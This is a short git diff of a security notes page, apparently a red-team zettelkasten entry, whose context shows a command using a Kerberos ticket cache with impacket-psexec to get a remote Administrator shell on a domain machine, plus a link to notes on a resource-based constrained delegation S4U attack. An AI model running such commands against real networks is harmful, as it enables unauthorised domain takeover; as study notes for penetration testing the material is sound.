@@ -8,6 +8,8 @@ export KRB5CCNAME=$(pwd)/smb.ticket.ccache
 impacket-psexec domain.local/Administrator@FQDNMachine.domain.local -k -no-pass
 ```
 
+` zet/20221003151145/README.md `
+
 # Related
 
 - [20221003151146](/zet/20221003151146/README.md) resource based constrained delegation S4U attack transfering tickets to attacker machine to psexec
